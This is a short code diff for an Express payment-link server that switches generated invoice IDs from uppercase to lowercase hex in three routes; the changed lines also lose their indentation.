@@ -516,7 +516,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
       return res.status(400).json({ status: "error", message: "Description required" });
     }
 
-    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
+const invoiceId = crypto.randomBytes(8).toString('hex').toLowerCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
     // Use the redirect file instead of landing.html and include amount parameter
@@ -554,7 +554,7 @@ app.post('/api/generateFreeLink', (req, res) => {
       return res.status(400).json({ status: "error", message: "Invalid free link request" });
     }
 
-    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
+const invoiceId = crypto.randomBytes(8).toString('hex').toLowerCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
     // Use the redirect file instead of landing.html and include amount=0 parameter
@@ -667,7 +667,7 @@ app.post('/api/sendPaymentDetails', (req, res) => {
       return res.status(400).json({ status: "error", message: "Missing fields" });
     }
 
-    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
+const invoiceId = crypto.randomBytes(8).toString('hex').toLowerCase();
     
     // Get IP address
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
